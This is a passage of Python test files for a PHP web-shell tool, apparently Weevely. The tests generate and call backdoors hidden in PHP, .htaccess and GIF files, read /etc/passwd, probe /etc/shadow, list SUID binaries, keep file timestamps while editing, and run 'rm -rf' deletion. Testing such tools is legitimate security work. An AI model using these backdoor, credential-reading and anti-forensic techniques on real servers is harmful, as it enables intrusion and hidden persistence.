from tempfile import NamedTemporaryFile
from os import path
from core.utils import randstr
import os, sys
sys.path.append(os.path.abspath('..'))
from test import conf
import modules.file.edit

class Edit(SimpleTestCase):
    
    def setUp(self):

        self.nonwritable_folder = '%s/nonwritable' % conf['env_base_writable_web_dir']
        self.writable_file = '%s/writable' % self.nonwritable_folder
        self.writable_file2 = '%s/writable2' % self.nonwritable_folder
        self.writable_file3 = '%s/writable3' % conf['env_base_writable_web_dir']
        
        self.editor = "echo -n 1 >> "
        
        self.__class__._env_mkdir(self.nonwritable_folder)
        self.__class__._env_newfile(self.writable_file, content='1')
        self.__class__._env_newfile(self.writable_file2, content='1')
        self.__class__._env_chmod(self.writable_file, mode='0777')
        self.__class__._env_chmod(self.nonwritable_folder, mode='0555')        
        
    
    def test_edit(self):
        
        temp_filename = path.join('/tmp', randstr(4) )
        self.assertTrue(self._res(""":file.edit %s -editor "%s" """ % (temp_filename, self.editor)))
        self.assertTrue(self._res(""":file.edit %s -editor "%s" """ % (temp_filename, self.editor)))
        
        self.assertEqual(self._res(":file.read %s" % temp_filename), '11')
        
        self.assertRegexpMatches(self._warn(""":file.edit /tmp/non/existant -editor "%s" """ % (self.editor)), modules.file.edit.WARN_UPLOAD_FAILED)
        self.assertRegexpMatches(self._warn(""":file.edit /etc/protocols -editor "%s" """ % (self.editor)), modules.file.edit.WARN_UPLOAD_FAILED)
        

    def test_edit_on_unwritable_folder(self):
        
        self.assertTrue(self._res(""":file.edit %s -editor "%s" """ % (self.writable_file, self.editor)))
        self.assertEqual(self._res(":file.read %s" % self.writable_file), '11')
        
        
    def test_keeping_timestamp(self):
        
        # Edit keeping timestamp
        self.assertEqual(self._res(""":file.touch -epoch 1 %s """ % (self.writable_file2)), 1)
        self.assertTrue(self._res(""":file.edit %s -editor "%s" -keep-ts""" % (self.writable_file2, self.editor)))
        self.assertEqual(self._res(":file.read %s" % self.writable_file2), '11')
        self.assertEqual(self._res(""":file.check %s time_epoch""" % (self.writable_file2,)), 1)
        
        # Edit unkeeping timestamp
        self.assertTrue(self._res(""":file.edit %s -editor "%s" """ % (self.writable_file2, self.editor)))
        self.assertNotEqual(self._res(""":file.check %s time_epoch""" % (self.writable_file2,)), 1)
        
        # Edit new file keeping timestamp (?)
        self.assertTrue(self._res(""":file.edit %s -editor "%s" -keep-ts""" % (self.writable_file3, self.editor)))
        self.assertEqual(self._res(":file.read %s" % self.writable_file3), '1')
        self.assertNotEqual(self._res(""":file.check %s time_epoch""" % (self.writable_file3,)), 1)
        

        
    def tearDown(self):
        
        self.__class__._env_chmod(self.nonwritable_folder, mode='0777')
        self.__class__._env_rm(self.writable_file)
        self.__class__._env_rm(self.writable_file2)
        self.__class__._env_rm(self.writable_file3)
        self.__class__._env_rm(self.nonwritable_folder)
        
        
        
########NEW FILE########
__FILENAME__ = test_enum
from baseclasses import SimpleTestCase
from tempfile import NamedTemporaryFile
import os


class FSEnum(SimpleTestCase):
    
    def test_enum(self):
        
        
        writable_file_path = os.path.join(self.basedir,'writable')
        self.__class__._env_newfile(writable_file_path)
        
        expected_enum_map = {
                    '/etc/passwd': ['exists', 'readable', '', ''],
                    writable_file_path: ['exists', 'readable', 'writable', ''],
                    '/etc/shadow': ['exists', '', '', ''],
                    'unexistant': ['', '', '', '']
                    }
        
        temp_path = NamedTemporaryFile(); 
        temp_path.write('\n'.join(expected_enum_map.keys()))
        temp_path.flush() 
        
        self.assertEqual(self._res(":file.enum a -pathlist \"%s\"" % str(expected_enum_map.keys())), expected_enum_map)        
        self.assertNotRegexpMatches(self._outp(":file.enum a -pathlist \"%s\"" % str(expected_enum_map.keys())), 'unexistant')        
        self.assertRegexpMatches(self._outp(":file.enum a -pathlist \"%s\" -printall" % str(expected_enum_map.keys())), 'unexistant')        

        self.assertEqual(self._res(":file.enum %s" % temp_path.name), expected_enum_map)        
        self.assertNotRegexpMatches(self._outp(":file.enum %s" % temp_path.name), 'unexistant')        
        self.assertRegexpMatches(self._outp(":file.enum %s -printall" % temp_path.name), 'unexistant')        
        
        temp_path.close();
########NEW FILE########
__FILENAME__ = test_etcpwd
from baseclasses import SimpleTestCase
from unittest import skipIf
from test import conf


class AuditEtcPwd(SimpleTestCase):
    
    def test_etcpwd(self):
        
        self.assertRegexpMatches(self._outp(":audit.etcpasswd"), 'mail:x:8:8:mail:/var/mail:/bin/sh')    
        self.assertRegexpMatches(self._outp(":audit.etcpasswd -real"), 'root:x:0:0:root:/root:/bin/bash')   
        self.assertNotRegexpMatches(self._outp(":audit.etcpasswd -real"), 'mail:x:8:8:mail:/var/mail:/bin/sh')  
        self.assertRegexpMatches(self._outp(":audit.etcpasswd -real -vector posix_getpwuid"), 'root:x:0:0:root:/root:/bin/bash')            
        self.assertRegexpMatches(self._outp(":audit.etcpasswd -real -vector read"), 'root:x:0:0:root:/root:/bin/bash')         
        
        
    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_etcpwd_cat(self):
        self.assertRegexpMatches(self._outp(":audit.etcpasswd -real -vector cat"), 'root:x:0:0:root:/root:/bin/bash')    
########NEW FILE########
__FILENAME__ = test_findnames
from baseclasses import FolderFileFSTestCase
from test import conf
import os, sys
sys.path.append(os.path.abspath('..'))
import modules
from unittest import skipIf


@skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
class FSFindCheck(FolderFileFSTestCase):

    
    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_suidsgid(self):
        result = self._res(':find.suidsgid -suid -rpath /usr/bin')
        self.assertTrue('/usr/bin/sudo' in result and not '/usr/bin/wall' in result)
        result = self._res(':find.suidsgid -sgid -rpath /usr/bin')
        self.assertTrue('/usr/bin/sudo' not in result and '/usr/bin/wall' in result)
        result = self._res(':find.suidsgid -rpath /usr/bin')
        self.assertTrue('/usr/bin/sudo' in result and '/usr/bin/wall' in result)

    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_name_find(self):

        sorted_files = sorted(['./%s' % x for x in self.filenames])
        sorted_folders = sorted(['./%s' % x for x in self.dirs])
        
        self.assertEqual(self._path('cd %s' % self.basedir), self.basedir)
        
        self.assertEqual(sorted(self._res(':find.name FILE- -vector find')), sorted_files)
        self.assertEqual(sorted(self._res(':find.name file- -case -vector find')), sorted_files)
        self.assertEqual(sorted(self._res(':find.name W[0-9] -vector find')), sorted_folders)     
        self.assertEqual(sorted(self._res(':find.name w[0-9] -case -vector find')), sorted_folders)
        self.assertEqual(sorted(self._res(':find.name file-1.txt -equal -vector find')), ['./w1/file-1.txt'])   
        self.assertEqual(sorted(self._res(':find.name 2.txt -rpath w1/w2 -vector find')), ['w1/w2/file-2.txt'])   
        


    def test_name(self):
        
        sorted_files = sorted(['./%s' % x for x in self.filenames])
        sorted_folders = sorted(['./%s' % x for x in self.dirs])
        
        self.assertEqual(self._path('cd %s' % self.basedir), self.basedir)
        self.assertEqual(sorted(self._res(':find.name FILE-')), sorted_files)
        self.assertEqual(sorted(self._res(':find.name file- -case')), sorted_files)
        self.assertEqual(sorted(self._res(':find.name W[0-9]')), sorted_folders)     
        self.assertEqual(sorted(self._res(':find.name w[0-9] -case')), sorted_folders)
        self.assertEqual(sorted(self._res(':find.name file-1.txt -equal')), ['./w1/file-1.txt'])   
        self.assertEqual(sorted(self._res(':find.name 2.txt -rpath w1/w2')), ['w1/w2/file-2.txt'])   

        self.assertEqual(sorted(self._res(':find.name fIle- -case')), [])
        self.assertEqual(sorted(self._res(':find.name W[0-9] -case')), [])
        self.assertEqual(sorted(self._res(':find.name ile-1.txt -equal')), [])   
        self.assertEqual(sorted(self._res(':find.name 2.txt -rpath w1/w2 -equal')), [])   
        self.assertEqual(sorted(self._res(':find.name 2.txt -rpath /asdsad -equal')), [])  

        self.assertEqual(sorted(self._res(':find.name FILE- -rpath w1 -no-recursion')), ['w1/file-1.txt'])
        self.assertEqual(sorted(self._res(':find.name file- -rpath w1 -case -no-recursion')), ['w1/file-1.txt'])
        self.assertEqual(sorted(self._res(':find.name W[0-9] -no-recursion')),  ['./w1'])   
        self.assertEqual(sorted(self._res(':find.name w[0-9] -case -no-recursion')), ['./w1'])       

        self.assertEqual(sorted(self._res(':find.name FILE- -rpath w1 -no-recursion -vector find')), ['w1/file-1.txt'])
        self.assertEqual(sorted(self._res(':find.name file- -rpath w1 -case -no-recursion  -vector find')), ['w1/file-1.txt'])
        self.assertEqual(sorted(self._res(':find.name W[0-9] -no-recursion  -vector find')),  ['./w1'])   
        self.assertEqual(sorted(self._res(':find.name w[0-9] -case -no-recursion  -vector find')), ['./w1'])           
        
        
########NEW FILE########
__FILENAME__ = test_findperms
from baseclasses import FolderFileFSTestCase
from test import conf
import os, sys
sys.path.append(os.path.abspath('..'))
import modules
from unittest import skipIf

class FSFindCheck(FolderFileFSTestCase):

    def setUp(self):
        self.sorted_files = sorted(['./%s' % x for x in self.filenames])
        self.sorted_folders = sorted(['./%s' % x for x in self.dirs] + ['.'])
        self.sorted_files_and_folders = sorted(self.sorted_files + self.sorted_folders)        

    def test_perms(self):
        
        self.assertEqual(self._path('cd %s' % self.basedir), self.basedir)
        self.assertEqual(sorted(self._outp(':find.perms').split('\n')), self.sorted_files_and_folders)
        self.assertEqual(sorted(self._outp(':find.perms -vector php_recursive').split('\n')), self.sorted_files_and_folders)
        self.assertEqual(sorted(self._outp(':find.perms -vector php_recursive -type f').split('\n')), self.sorted_files)
        self.assertEqual(sorted(self._outp(':find.perms -vector php_recursive -type d').split('\n')), self.sorted_folders)

    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_perms_sh(self):
        self.assertEqual(sorted(self._outp(':find.perms -vector find').split('\n')), self.sorted_files_and_folders)
        self.assertEqual(sorted(self._outp(':find.perms -vector find -type f').split('\n')), self.sorted_files)
        self.assertEqual(sorted(self._outp(':find.perms -vector find -type d').split('\n')), self.sorted_folders)


    def test_specific_perms(self):
        
        self.assertEqual(self._path('cd %s' % self.basedir), self.basedir)
        self.__class__._env_chmod(self.dirs[3], mode='0555', recursive=True) # -xr
        self.assertEqual(self._outp(':find.perms %s -writable' % self.dirs[3]), '')
        self.assertEqual(sorted(self._outp(':find.perms %s -executable' % self.dirs[3]).split('\n')), [self.dirs[3], self.filenames[3]])
        self.assertEqual(sorted(self._outp(':find.perms %s -readable' % self.dirs[3]).split('\n')), [self.dirs[3], self.filenames[3]])

        self.__class__._env_chmod(self.filenames[3], mode='0111') #--x 
        self.assertRegexpMatches(self._outp(':find.perms %s -vector php_recursive -executable' % self.dirs[3]), self.filenames[3])
        self.assertNotRegexpMatches(self._outp(':find.perms %s -vector php_recursive -writable' % self.dirs[3]), self.filenames[3])
        self.assertNotRegexpMatches(self._outp(':find.perms %s -vector php_recursive -readable' % self.dirs[3]), self.filenames[3])
        self.__class__._env_chmod(self.filenames[3], mode='0222') #-w-
        self.assertNotRegexpMatches(self._outp(':find.perms %s -vector php_recursive -executable' % self.dirs[3]), self.filenames[3])
        self.assertRegexpMatches(self._outp(':find.perms %s -vector php_recursive -writable' % self.dirs[3]), self.filenames[3])
        self.assertNotRegexpMatches(self._outp(':find.perms %s -vector php_recursive -readable' % self.dirs[3]), self.filenames[3])
        self.__class__._env_chmod(self.filenames[3], mode='0444') #r--
        self.assertNotRegexpMatches(self._outp(':find.perms %s -vector php_recursive -executable' % self.dirs[3]), self.filenames[3])
        self.assertNotRegexpMatches(self._outp(':find.perms %s -vector php_recursive -writable' % self.dirs[3]), self.filenames[3])
        self.assertRegexpMatches(self._outp(':find.perms %s -vector php_recursive -readable' % self.dirs[3]), self.filenames[3])

    def test_no_recursion(self):

        self.assertEqual(self._path('cd %s' % self.basedir), self.basedir)
        self.assertEqual(sorted(self._res(':find.perms -no-recursion')), self.sorted_files_and_folders[:2])
        self.assertEqual(sorted(self._res(':find.perms -vector php_recursive -no-recursion')), self.sorted_files_and_folders[:2])
        self.assertEqual(sorted(self._res(':find.perms -vector php_recursive -type f -no-recursion')), [])
        self.assertEqual(sorted(self._res(':find.perms -vector php_recursive -type d -no-recursion')), self.sorted_folders[:2])

    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_no_recursion_sh(self):

        self.assertEqual(self._path('cd %s' % self.basedir), self.basedir)
        self.assertEqual(sorted(self._res(':find.perms -no-recursion')), self.sorted_files_and_folders[:2])
        self.assertEqual(sorted(self._res(':find.perms -vector find -no-recursion')), self.sorted_files_and_folders[:2])
        self.assertEqual(sorted(self._res(':find.perms -vector find -no-recursion')), self.sorted_files_and_folders[:2])
        self.assertEqual(sorted(self._res(':find.perms -vector find -type f -no-recursion')), [])
        self.assertEqual(sorted(self._res(':find.perms -vector find -type d -no-recursion')), self.sorted_folders[:2])

    @skipIf(not conf['shell_sh'] , "Skipping shell.sh dependent tests")
    def test_equal_vector(self):

        self.assertEqual(self._path('cd %s' % self.basedir), self.basedir)
        
        # Disable shell.sh stderr to avoid "file not found" warning message pollution
        self._res(":set shell.sh -no-stderr")
        
        self.assertEqual(sorted(self._res(':find.perms -vector php_recursive')), sorted(self._res(':find.perms -vector find')))
        self.assertEqual(sorted(self._res(':find.perms -vector php_recursive -writable')), sorted(self._res(':find.perms -vector find -writable')))
        self.assertEqual(sorted(self._res(':find.perms -vector php_recursive -readable')), sorted(self._res(':find.perms -vector find -readable')))
        self.assertEqual(sorted(self._res(':find.perms -vector php_recursive -executable')), sorted(self._res(':find.perms -vector find -executable')))

        self.assertEqual(sorted(self._res(':find.perms /var/log/ -vector php_recursive ')), sorted(self._res(':find.perms /var/log/ -vector find')))
        self.assertEqual(sorted(self._res(':find.perms /var/log/ -vector php_recursive -writable')), sorted(self._res(':find.perms /var/log/ -vector find -writable')))
        self.assertEqual(sorted(self._res(':find.perms /var/log/ -vector php_recursive -readable')), sorted(self._res(':find.perms /var/log/ -vector find -readable')))
        self.assertEqual(sorted(self._res(':find.perms /var/log/ -vector php_recursive -executable')), sorted(self._res(':find.perms /var/log/ -vector find -executable')))


    
########NEW FILE########
__FILENAME__ = test_fsbrowse
from baseclasses import FolderFSTestCase
import os
from test import conf
from unittest import skipIf


@skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
class ShellsFSBrowse(FolderFSTestCase):

        
    def test_ls(self):
        
        self.assertEqual(self._outp('ls %s' % self.basedir), self.dirs[0])
        self.assertEqual(self._outp('ls %s' % os.path.join(self.basedir,self.dirs[0])), self.dirs[1].split('/')[-1])
        self.assertEqual(self._outp('ls %s' % os.path.join(self.basedir,self.dirs[1])), self.dirs[2].split('/')[-1])
        self.assertEqual(self._outp('ls %s' % os.path.join(self.basedir,self.dirs[2])), self.dirs[3].split('/')[-1])
        self.assertEqual(self._outp('ls %s' % os.path.join(self.basedir,self.dirs[3])), '')
        self.assertEqual(self._outp('ls %s/.././/../..//////////////./../../%s/' % (self.basedir, self.basedir)), self.dirs[0])

    def test_cwd(self):
        
        
        self.assertEqual(self._path('cd %s' % self.basedir), self.basedir)
        self.assertEqual(self._path('cd %s' % os.path.join(self.basedir,self.dirs[3])), os.path.join(self.basedir,self.dirs[3]))
        self.assertEqual(self._path('cd .'), os.path.join(self.basedir,self.dirs[3]))
        self.assertEqual(self._path('cd ..'), os.path.join(self.basedir,self.dirs[2]))
        self.assertEqual(self._path('cd ..'), os.path.join(self.basedir,self.dirs[1]))
        self.assertEqual(self._path('cd ..'), os.path.join(self.basedir,self.dirs[0]))
        self.assertEqual(self._path('cd ..'), self.basedir)
        self.assertEqual(self._path('cd %s' % os.path.join(self.basedir,self.dirs[3])), os.path.join(self.basedir,self.dirs[3]))
        self.assertEqual(self._path('cd .././/../..//////////////./../%s/../' % self.dirs[0]), self.basedir)

########NEW FILE########
__FILENAME__ = test_fsremove
from baseclasses import FolderFileFSTestCase
from test import conf
import os, sys
sys.path.append(os.path.abspath('..'))
import modules
from unittest import skipIf

class FSRemove(FolderFileFSTestCase):

    def test_rm(self):
        
        # Delete a single file
        self.assertEqual(self._res(':file.rm %s' % os.path.join(self.basedir,self.filenames[1])), True)
        self.assertRegexpMatches(self._warn(':file.rm %s' % os.path.join(self.basedir,self.filenames[1])), modules.file.rm.WARN_NO_SUCH_FILE)
        
        # Delete a single file recursively
        self.assertEqual(self._res(':file.rm %s -recursive' % os.path.join(self.basedir,self.filenames[2])), True)
        self.assertRegexpMatches(self._warn(':file.rm %s -recursive' % os.path.join(self.basedir,self.filenames[2])), modules.file.rm.WARN_NO_SUCH_FILE)
        
        # Try to delete dir tree without recursion
        self.assertRegexpMatches(self._warn(':file.rm %s' % os.path.join(self.basedir,self.dirs[0])), modules.file.rm.WARN_DELETE_FAIL)
        
        # Delete dir tree with recursion
        self.assertEqual(self._res(':file.rm %s -recursive' % os.path.join(self.basedir,self.dirs[3])), True)
        
        # Vectors
        self.assertRegexpMatches(self._warn(':set shell.php -debug 1'), 'debug=\'1\'')
        self.assertRegexpMatches(self._warn(':file.rm %s -recursive -vector php_rmdir' % os.path.join(self.basedir,self.dirs[2])), 'function rrmdir')
        self.assertRegexpMatches(self._warn(':set shell.php -debug 4'), 'debug=\'4\'')

    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_rm_shell(self):

        # Vectors
        self.assertRegexpMatches(self._warn(':set shell.php -debug 1'), 'debug=\'1\'')
        self.assertRegexpMatches(self._warn(':file.rm %s -recursive -vector rm' % os.path.join(self.basedir,self.dirs[1])), 'rm -rf %s' % os.path.join(self.basedir,self.dirs[1]) )
        self.assertRegexpMatches(self._warn(':set shell.php -debug 4'), 'debug=\'4\'')
        
        
    @skipIf(not conf['rm_undeletable'], "No undeletable file specified")
    def test_rm_undeletable(self):
        # No permissions
        self.assertRegexpMatches(self._warn(':file.rm %s' % conf['rm_undeletable']), modules.file.rm.WARN_DELETE_FAIL)
        
########NEW FILE########
__FILENAME__ = test_generators
from baseclasses import SimpleTestCase
from test import conf
from core.utils import randstr
import os, sys, shutil
from string import ascii_lowercase
sys.path.append(os.path.abspath('..'))
import modules
from tempfile import NamedTemporaryFile, mkdtemp
import modules.generate.php
import modules.generate.img
import core.backdoor
from commands import getstatusoutput
from unittest import skipIf

class Generators(SimpleTestCase):
    
    def __test_new_bd(self, relpathfrom, phpbdname, phpbd_pwd):
 
        
        self.__class__._env_cp(relpathfrom, phpbdname)

        web_base_url = '%s%s' %  (conf['env_base_web_url'], self.basedir.replace(conf['env_base_web_dir'],''))
        phpbd_url = os.path.join(web_base_url, phpbdname)
        
        call = ':shell.php "echo(1+1);"'
        command = '%s %s %s %s' % (conf['cmd'], phpbd_url, phpbd_pwd, call)
        status, output = getstatusoutput(command)
        self.assertEqual('2', output)

        self.__class__._env_rm(phpbdname)
         
    
    def test_php(self):
        
        phpbd_pwd = randstr(4)
        temp_file = NamedTemporaryFile(); temp_file.close(); 
        
        self.assertEqual(self._res(':generate.php %s %s'  % (phpbd_pwd, temp_file.name)),temp_file.name)
        self.assertEqual(self._res(':generate.php %s'  % (phpbd_pwd)),'weevely.php')
        self.assertTrue(os.path.isfile('weevely.php'))
        os.remove('weevely.php')
            
        
        self.assertRegexpMatches(self._warn(':generate.php %s /tmp/sdalkjdas/kjh'  % (phpbd_pwd)), modules.generate.php.WARN_WRITING_DATA)
        self.assertRegexpMatches(self._warn(':generate.php %s %s2'  % (phpbd_pwd[:2], temp_file.name)), core.backdoor.WARN_SHORT_PWD)
        self.assertRegexpMatches(self._warn(':generate.php @>!? %s3'  % (temp_file.name)), core.backdoor.WARN_CHARS)


        # No output expected 
        self.assertEqual(self._outp(':generate.php %s %s'  % (phpbd_pwd, temp_file.name+'2')),'')

        self.__test_new_bd(temp_file.name, '%s.php' % randstr(5), phpbd_pwd)
        
        
    @skipIf(not conf['remote_allowoverride'] or "off" in conf['remote_allowoverride'].lower(), "Skipping for missing AllowOverride")
    def test_htaccess(self):
        
        phpbd_pwd = randstr(4)
        temp_file = NamedTemporaryFile(); temp_file.close(); 
        
        self.assertEqual(self._res(':generate.htaccess %s %s'  % (phpbd_pwd, temp_file.name)),temp_file.name)
        self.assertEqual(self._res(':generate.htaccess %s'  % (phpbd_pwd)),'.htaccess')
        self.assertTrue(os.path.isfile('.htaccess'))
        os.remove('.htaccess')
        
        self.assertRegexpMatches(self._warn(':generate.htaccess %s /tmp/sdalkjdas/kjh'  % (phpbd_pwd)), modules.generate.php.WARN_WRITING_DATA)
        self.assertRegexpMatches(self._warn(':generate.htaccess %s %s2'  % (phpbd_pwd[:2], temp_file.name)), core.backdoor.WARN_SHORT_PWD)
        self.assertRegexpMatches(self._warn(':generate.htaccess @>!?!* %s3'  % (temp_file.name)), core.backdoor.WARN_CHARS)


        # No output expected 
        self.assertEqual(self._outp(':generate.htaccess %s %s'  % (phpbd_pwd, temp_file.name+'2')),'')

        self.__test_new_bd(temp_file.name, '.htaccess', phpbd_pwd)
        

    @skipIf(not conf['remote_allowoverride'] or "off" in conf['remote_allowoverride'].lower(), "Skipping for missing AllowOverride")
    def test_img(self):
        
        phpbd_pwd = randstr(4)
        temp_file = NamedTemporaryFile(); temp_file.close(); 
        temp_imgpathname = '%s.gif' % temp_file.name 
        temp_path, temp_filename = os.path.split(temp_imgpathname)
        
        temp_outputdir = mkdtemp()
        
        status, output = getstatusoutput(conf['env_create_backdoorable_img'] % temp_imgpathname)
        self.assertEqual(0, status)        
        
        self.assertEqual(self._res(':generate.img %s %s'  % (phpbd_pwd, temp_imgpathname)), [os.path.join('bd_output',temp_filename), 'bd_output/.htaccess'])
        self.assertTrue(os.path.isdir('bd_output'))
        shutil.rmtree('bd_output')
        
        self.assertRegexpMatches(self._warn(':generate.img %s /tmp/sdalkj'  % (phpbd_pwd)), modules.generate.img.WARN_IMG_NOT_FOUND)
        self.assertRegexpMatches(self._warn(':generate.img %s %s /tmp/ksdajhjksda/kjdha'  % (phpbd_pwd, temp_imgpathname)), modules.generate.img.WARN_DIR_CREAT)
        self.assertRegexpMatches(self._warn(':generate.img [@>!?] %s %s3'  % (temp_imgpathname, temp_outputdir)), core.backdoor.WARN_CHARS)

        self.assertEqual(self._res(':generate.img %s %s %s'  % (phpbd_pwd, temp_imgpathname, temp_outputdir)), [os.path.join(temp_outputdir,temp_filename), os.path.join(temp_outputdir, '.htaccess')])


        # No output expected 
        self.assertEqual(self._outp(':generate.img %s %s %s'  % (phpbd_pwd, temp_imgpathname, temp_outputdir+'2')), '')

        self.__class__._env_chmod(temp_outputdir, '0777')
        self.__class__._env_cp(os.path.join(temp_outputdir, '.htaccess'), '.htaccess')

        self.__test_new_bd( os.path.join(temp_outputdir,temp_filename), temp_filename, phpbd_pwd)
       
########NEW FILE########
__FILENAME__ = test_help
from baseclasses import SimpleTestCase
from tempfile import NamedTemporaryFile
import os, sys
sys.path.append(os.path.abspath('..'))
import modules.shell.sh
import modules.shell.php


class FSEnum(SimpleTestCase):
    
    def test_help(self):
        help_output = self._warn(":help" )
        self.assertRegexpMatches(help_output, '|[\s]module[\s]+|[\s]description[\s]+|[\n]{%i}' % (len(self.term.modhandler.modules_classes)+2))       
        self.assertNotRegexpMatches(help_output, '\n'*4)       
        
        help_shell_output = self._warn(":help shell" )
        sh_descr = modules.shell.sh.Sh.__doc__
        php_descr = modules.shell.php.Php.__doc__
        self.assertRegexpMatches(help_shell_output, '\[shell\.sh\] %s[\s\S]+usage:[\s\S]+\[shell\.php\] %s[\s\S]+usage:[\s\S]+' % (sh_descr, php_descr))
        self.assertNotRegexpMatches(help_shell_output, '\n'*4)       
        
        help_nonexistant_output = self._warn(":help nonexistant" )
        self.assertRegexpMatches(help_nonexistant_output, '')
        
        help_shell_sh_output = self._warn(":help shell.sh" )
        self.assertRegexpMatches(help_shell_sh_output, 'usage:[\s\S]+%s[\s\S]+positional arguments:[\s\S]+optional arguments:[\s\S]+stored arguments:[\s\S]+' % (sh_descr))
        self.assertNotRegexpMatches(help_shell_sh_output, '\n'*3)       
        
########NEW FILE########
__FILENAME__ = test_load
from baseclasses import RcTestCase
from tempfile import NamedTemporaryFile
from commands import getstatusoutput
from test import conf
from unittest import skipIf
import ConfigParser
from core.sessions import default_session 
import os

rc_content = """
:shell.php print(\'W\');
:set shell.php -debug 1
echo EE
# echo X
# shell.php print(\'X\');
:set shell.php
echo VELY
"""

@skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
class Load(RcTestCase):

    def test_load(self):
        
        self.__class__._write_rc(rc_content)
        
        self.assertEqual(self._outp(':load %s' % self.__class__.rcpath), 'WEEVELY')
        self.assertRegexpMatches(self._warn(':load %s_UNEXISTANT' % self.__class__.rcpath), 'Error opening')
        
        # Dump session file
        session_name = self.__class__.rcpath + '.session'

        session = default_session.copy()
        session['global']['url'] = self.term.modhandler.url
        session['global']['password'] = self.term.modhandler.password
        session['global']['rcfile'] = self.__class__.rcpath
        self.term.modhandler.sessions._dump_session(session, session_name)
        
        call = "'echo'"
        command = '%s session %s %s' % (conf['cmd'], session_name, call)
        status, output = getstatusoutput(command)
        
        # Remove session
        os.remove(session_name)
        
        self.assertRegexpMatches(output, '\nW[\s\S]+\nEE[\s\S]+\nVELY')  
        
########NEW FILE########
__FILENAME__ = test_ls
from baseclasses import FolderFSTestCase
import os
from test import conf
from unittest import skipIf
import modules.file.ls


class ShellsLS(FolderFSTestCase):

        
    def test_ls(self):
        
        self.assertEqual(self._outp(':file.ls %s' % self.basedir), self.dirs[0])
        self.assertEqual(self._outp(':file.ls %s' % os.path.join(self.basedir,self.dirs[0])), self.dirs[1].split('/')[-1])
        self.assertEqual(self._outp(':file.ls %s' % os.path.join(self.basedir,self.dirs[1])), self.dirs[2].split('/')[-1])
        self.assertEqual(self._outp(':file.ls %s' % os.path.join(self.basedir,self.dirs[2])), self.dirs[3].split('/')[-1])
        self.assertEqual(self._outp(':file.ls %s' % os.path.join(self.basedir,self.dirs[3])), '')
        self.assertEqual(self._outp(':file.ls %s/.././/../..//////////////./../../%s/' % (self.basedir, self.basedir)), self.dirs[0])

        self.assertEqual(self._outp(':file.ls -vector ls_php %s' % os.path.join(self.basedir,self.dirs[3])), '')
        self.assertEqual(self._outp(':file.ls -vector ls_php %s/.././/../..//////////////./../../%s/' % (self.basedir, self.basedir)), self.dirs[0])
 
        # Unexistant and not-readable folders
        self.assertRegexpMatches(self._warn(':file.ls /asdsdadsa'), modules.file.ls.WARN_NO_SUCH_FILE)
        self.assertRegexpMatches(self._warn(':file.ls /root/'), modules.file.ls.WARN_NO_SUCH_FILE)
 
        # Not readable files
        self.assertEqual(self._outp(':file.ls /etc/shadow'), '/etc/shadow')
 
 
    @skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
    def test_system_ls(self):
        
        # Check vector correspondance
        self.assertEqual(self._outp(':file.ls -vector ls %s' % os.path.join(self.basedir,self.dirs[3])), self._outp(':file.ls -vector ls_php %s' % os.path.join(self.basedir,self.dirs[3])))
        self.assertEqual(self._outp(':file.ls -vector ls %s/.././/../..//////////////./../../%s/' % (self.basedir, self.basedir)), self._outp(':file.ls -vector ls_php %s/.././/../..//////////////./../../%s/' % (self.basedir, self.basedir)))

        # Check ls arguments
        self.assertRegexpMatches(self._outp(':file.ls -vector ls / -- -al'), 'root[\s]+root[\s]')
        
########NEW FILE########
__FILENAME__ = test_mount
from baseclasses import FolderFSTestCase
from test import conf
from core.utils import randstr
from tempfile import mkdtemp
import os, sys
from string import ascii_lowercase
sys.path.append(os.path.abspath('..'))
import modules
import modules.file.mount
import modules.file.upload2web
import modules.file.upload

class Mount(FolderFSTestCase):


    def test_mount_expected_behaviour(self):
        
        temp_filename = randstr(4) + '.php'
        env_writable_url = os.path.join(conf['env_base_web_url'], conf['env_base_writable_web_dir'].replace(conf['env_base_web_dir'],''))
        env_writable_baseurl = os.path.join(env_writable_url, os.path.split(self.basedir)[-1])
        
        temp_dir = mkdtemp()
        
        self._outp('cd %s' % self.basedir)
        
        res = self._res(':file.mount')
        self.assertTrue(res and res[0].startswith(env_writable_baseurl) and res[0].endswith('.php') and res[1].startswith('/tmp/tmp') and res[2] == self.basedir)
        
        res = self._res(':file.mount -remote-mount /tmp/')
        self.assertTrue(res and res[0].startswith(env_writable_baseurl) and res[0].endswith('.php') and res[1].startswith('/tmp/tmp') and res[2] == '/tmp')

        res = self._res(':file.mount -local-mount %s' % temp_dir)
        self.assertTrue(res and res[0].startswith(env_writable_baseurl) and res[0].endswith('.php') and res[1] == temp_dir and res[2] == self.basedir)

        self.assertTrue(self._res(':file.mount -umount-all'))

        res = self._res(':file.mount -local-mount %s -rpath %s' % (temp_dir, temp_filename))
        self.assertTrue(res and res[0] == os.path.join(env_writable_baseurl, temp_filename) and res[1] == temp_dir and res[2] == self.basedir)
        
        res = self._res(':file.mount -rpath %s -force' % (temp_filename))
        self.assertTrue(res and res[0] == os.path.join(env_writable_baseurl, temp_filename) and res[1].startswith('/tmp/tmp') and res[2] == self.basedir)
        
        res = self._res(':file.mount -startpath %s' % (self.dirs[0]))
        self.assertTrue(res and res[0].startswith(os.path.join(env_writable_baseurl,self.dirs[0])) and res[0].endswith('.php') and res[1].startswith('/tmp/tmp') and res[2] == self.basedir)

        res = self._res(':file.mount -just-mount %s ' % os.path.join(env_writable_baseurl, temp_filename))
        self.assertTrue(res and res[0] == os.path.join(env_writable_baseurl, temp_filename) and res[1].startswith('/tmp/tmp') and res[2] == self.basedir)
        
        res = self._res(':file.mount -just-install')
        self.assertTrue(res and res[0].startswith(env_writable_baseurl) and res[0].endswith('.php') and res[1] == None and res[2] == self.basedir)


        self.assertTrue(self._res(':file.mount -umount-all'))
        self.assertRegexpMatches(self._warn(':file.mount -umount-all'), modules.file.mount.WARN_MOUNT_NOT_FOUND)

        
    def test_mount_errors(self):
        
        temp_filename = randstr(4) + '.php'
